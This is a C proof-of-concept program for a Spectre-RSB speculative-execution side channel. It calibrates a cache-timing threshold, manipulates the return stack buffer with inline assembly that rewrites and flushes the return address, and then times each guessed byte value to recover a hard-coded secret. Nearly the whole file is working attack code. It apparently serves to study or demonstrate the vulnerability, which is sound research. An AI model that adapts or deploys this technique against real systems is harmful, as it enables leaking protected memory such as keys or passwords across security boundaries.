#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#define BLOCK_SIZE 512
#define TRY_TIMES 5000

uint64_t secret[] = {0x88};

uint64_t time_records[256];
uint64_t tte_time_records[256];

__always_inline void flush(void *p) { asm volatile("clflush 0(%0)" : : "r"(p) :); }

__always_inline void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

__always_inline void mfence() { asm volatile("mfence" : : :); }

__always_inline void lfence() { asm volatile("lfence" : : :); }

__always_inline void sfence() { asm volatile("sfence" : : :); }

__always_inline uint64_t get_time()
{
    uint64_t lo, hi;
    asm volatile("rdtscp\n" : "=a"(lo), "=d"(hi) : : "rcx");
    return (hi << 32) | lo;
}

void spectre_rsb()
{
    uint64_t start_time, end_time;
    uint8_t *array = (uint8_t *)mmap(NULL, BLOCK_SIZE * 256, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
    uint64_t threshold = 0;

    for (size_t i = 0; i < 100; i++)
    {
        maccess(array);
        mfence();
        start_time = get_time();
        mfence();
        maccess(array);
        mfence();
        end_time = get_time();
        threshold += (end_time - start_time);
    }
    for (size_t i = 0; i < 100; i++)
    {
        flush(array);
        mfence();
        start_time = get_time();
        mfence();
        maccess(array);
        mfence();
        end_time = get_time();
        threshold += (end_time - start_time);
    }
    threshold /= 200;
    threshold *= TRY_TIMES;
    printf("threshold: %ld\n", threshold);

    memset(time_records, 0, sizeof(time_records));
    for (int t = 0; t < TRY_TIMES; t++)
    {
        for (size_t k = 0; k < 256; ++k)
        {
            size_t x = ((k * 167) + 13) & (0xff);
            volatile void *p = array + x * BLOCK_SIZE;
            asm volatile("clflush (%0)\n" ::"r"(p));
        }
        mfence();
        for (uint32_t i = 0; i < 256; i++)
        {
            char c = secret[0];
            lfence();
            uint8_t test_value = i;
            mfence();
            start_time = get_time();
            lfence();
            asm volatile(
                "call rsb_inject\n"
                // mov secret 88 to rax
                "movabs $88, %%rax\n"
                "mov %1, %%bl\n"
                "nop\n"

                "sub %%al, %%bl\n"
                "jz test_match\n"
                "jmp test_no_match\n"
                "nop\n"
                "test_no_match: nop\n"
                "test_match: nop\n"
                "mov (0), %%rax\n"

                "rsb_inject: nop\n"
                "movabs $final, %%rax\n"
                "imulq $1, %%rax, %%rax\n"
                "mov %%eax, (%%rsp)\n"
                "clflush (%%rsp)\n"
                "retq\n"

                "final:\n"
                :
                : "r"(array), "r"(test_value), [secret] "r"(secret)
                : "rax");
            sfence();
            end_time = get_time();
            mfence();
            time_records[i] += (end_time - start_time);
        }
    }
    for (size_t i = 0; i < 256; i++)
    {
        if (i % 8 == 0)
        {
            printf("\n");
        }
        if (time_records[i] > threshold)
        {
            printf("%3d:%4ld ", i, time_records[i]);
        }
        else
        {
            printf("%3d:\033[1;33m%4ld\033[0m ", i, time_records[i]);
        }
    }
    printf("\n");

    for (size_t i = 80; i < 97; i++)
    {
        printf("%3d:%4ld ", i, time_records[i]);
        for (size_t j = 0; j < time_records[i] / (10 * TRY_TIMES); j++)
        {
            printf("#");
        }
        printf("\n");
    }
}

int main(int argc, char const *argv[])
{
    spectre_rsb();
    return 0;
}
